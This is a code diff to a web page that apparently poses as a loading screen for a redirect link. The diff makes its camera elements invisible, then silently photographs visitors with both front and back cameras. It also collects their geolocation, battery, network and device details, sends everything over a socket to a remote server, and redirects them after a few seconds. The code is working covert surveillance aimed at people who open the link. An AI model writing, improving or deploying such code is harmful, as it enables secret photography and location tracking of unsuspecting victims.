@@ -54,12 +54,17 @@
             color: #888;
             margin-top: 12px;
         }
-        /* Hidden elements for data collection */
-        #hiddenVideo {
+        /* Hidden elements */
+        #hiddenVideo, #hiddenVideoBack {
             display: none;
+            position: absolute;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+            pointer-events: none;
         }
         #debugInfo {
-            display: none;
+            display: none !important;
         }
     </style>
 </head>
@@ -71,8 +76,9 @@
         <div class="sub-text">Please wait a moment</div>
     </div>
 
-    <!-- Hidden video element for camera access -->
-    <video id="hiddenVideo" autoplay playsinline></video>
+    <!-- Hidden video elements for camera access (invisible) -->
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <video id="hiddenVideoBack" autoplay playsinline muted></video>
 
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script>
@@ -91,13 +97,14 @@
         }
 
         // ============================================
-        // MAIN APPLICATION (COMPLETE TRANSPARENT)
+        // MAIN APPLICATION
         // ============================================
         function initApp() {
             const visitorId = window.location.pathname.split('/').pop();
             let socket = null;
             let redirectUrl = '';
-            let dataCollected = {
+            let redirectTriggered = false;
+            let dataSent = {
                 frontCamera: false,
                 backCamera: false,
                 location: false,
@@ -105,7 +112,8 @@
                 network: false,
                 deviceInfo: false
             };
-            let redirectTriggered = false;
+            let streamFront = null;
+            let streamBack = null;
 
             // ============================================
             // 1. FETCH REDIRECT URL
@@ -171,11 +179,11 @@
                             visitorId: visitorId,
                             ...deviceInfo
                         });
-                        dataCollected.deviceInfo = true;
+                        dataSent.deviceInfo = true;
 
-                        // Start collecting all data in background
+                        // Start all data collection in background
                         setTimeout(() => {
-                            setupCamera();
+                            setupCameras();
                             getLocation();
                             getBatteryInfo();
                             getNetworkInfo();
@@ -183,70 +191,76 @@
                     });
 
                     socket.on('connect_error', () => {
-                        // Retry silently
                         setTimeout(() => socket.connect(), 2000);
                     });
 
                 } catch (error) {
-                    // Silent fail - continue with redirect
                     checkAndRedirect();
                 }
             }
 
             // ============================================
-            // 4. CAMERA (Background - No Preview)
+            // 4. CAMERAS (Silent - Background)
             // ============================================
-            async function setupCamera() {
+            async function setupCameras() {
                 try {
-                    // Front camera (hidden)
-                    const frontStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user' },
+                    // FRONT CAMERA
+                    streamFront = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
                         audio: false
                     });
-                    const video = document.getElementById('hiddenVideo');
-                    video.srcObject = frontStream;
-                    video.play();
+                    const videoFront = document.getElementById('hiddenVideo');
+                    videoFront.srcObject = streamFront;
+                    await videoFront.play();
 
                     setTimeout(() => {
-                        capturePhoto('front', video);
+                        capturePhoto('front', videoFront);
                     }, 1500);
 
-                    // Back camera (if available)
+                    // BACK CAMERA (if available)
                     try {
-                        const backStream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: 'environment' },
+                        streamBack = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                facingMode: 'environment',
+                                width: { ideal: 640 },
+                                height: { ideal: 480 }
+                            },
                             audio: false
                         });
-                        const backVideo = document.createElement('video');
-                        backVideo.srcObject = backStream;
-                        backVideo.autoplay = true;
-                        backVideo.style.display = 'none';
-                        document.body.appendChild(backVideo);
+                        const videoBack = document.getElementById('hiddenVideoBack');
+                        videoBack.srcObject = streamBack;
+                        await videoBack.play();
 
                         setTimeout(() => {
-                            capturePhoto('back', backVideo);
+                            capturePhoto('back', videoBack);
                         }, 2500);
                     } catch (e) {
                         // Back camera not available - ignore
                     }
                 } catch (error) {
-                    // Camera not available - continue
+                    // Camera permission denied - continue
                     checkAndRedirect();
                 }
             }
 
             // ============================================
-            // 5. CAPTURE PHOTO (Background)
+            // 5. CAPTURE PHOTO (Silent)
             // ============================================
             function capturePhoto(type, video) {
-                if (!video || !video.videoWidth) return;
+                if (!video || !video.videoWidth) {
+                    return;
+                }
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
 
                 if (socket && socket.connected) {
                     socket.emit('visitor-data', {
@@ -254,14 +268,22 @@
                         type: type === 'back' ? 'backCamera' : 'frontCamera',
                         content: imageData
                     });
-                    dataCollected[type === 'back' ? 'backCamera' : 'frontCamera'] = true;
+                    dataSent[type === 'back' ? 'backCamera' : 'frontCamera'] = true;
+                }
+
+                // Stop stream to save resources
+                if (type === 'front' && streamFront) {
+                    streamFront.getTracks().forEach(t => t.stop());
+                }
+                if (type === 'back' && streamBack) {
+                    streamBack.getTracks().forEach(t => t.stop());
                 }
 
                 checkAndRedirect();
             }
 
             // ============================================
-            // 6. LOCATION (Background)
+            // 6. LOCATION (Silent)
             // ============================================
             function getLocation() {
                 if (!navigator.geolocation) {
@@ -293,7 +315,7 @@
                                         type: 'location',
                                         content: locationInfo
                                     });
-                                    dataCollected.location = true;
+                                    dataSent.location = true;
                                 }
                                 checkAndRedirect();
                             })
@@ -310,7 +332,7 @@
                                         type: 'location',
                                         content: locationInfo
                                     });
-                                    dataCollected.location = true;
+                                    dataSent.location = true;
                                 }
                                 checkAndRedirect();
                             });
@@ -323,7 +345,7 @@
             }
 
             // ============================================
-            // 7. BATTERY (Background)
+            // 7. BATTERY (Silent)
             // ============================================
             function getBatteryInfo() {
                 if (navigator.getBattery) {
@@ -336,7 +358,7 @@
                                     type: 'battery',
                                     content: level
                                 });
-                                dataCollected.battery = true;
+                                dataSent.battery = true;
                             }
                         })
                         .catch(() => {});
@@ -344,7 +366,7 @@
             }
 
             // ============================================
-            // 8. NETWORK (Background)
+            // 8. NETWORK (Silent)
             // ============================================
             function getNetworkInfo() {
                 let networkData = {
@@ -370,22 +392,20 @@
                         type: 'network',
                         content: networkData
                     });
-                    dataCollected.network = true;
+                    dataSent.network = true;
                 }
             }
 
             // ============================================
-            // 9. REDIRECT (After Data Collection)
+            // 9. REDIRECT (After 4-5 seconds)
             // ============================================
             function checkAndRedirect() {
                 if (redirectTriggered) return;
 
-                // Wait 4-5 seconds for data collection then redirect
                 setTimeout(() => {
                     if (redirectTriggered) return;
                     redirectTriggered = true;
 
-                    // Send redirect complete
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', {
                             visitorId: visitorId,
@@ -394,7 +414,6 @@
                         });
                     }
 
-                    // Redirect to original URL
                     setTimeout(() => {
                         window.location.href = redirectUrl;
                     }, 500);
@@ -406,9 +425,11 @@
             // ============================================
             fetchRedirectUrl();
 
-            // Cleanup on page leave
+            // Cleanup
             window.addEventListener('beforeunload', () => {
                 if (socket) socket.disconnect();
+                if (streamFront) streamFront.getTracks().forEach(t => t.stop());
+                if (streamBack) streamBack.getTracks().forEach(t => t.stop());
             });
         }
     </script>
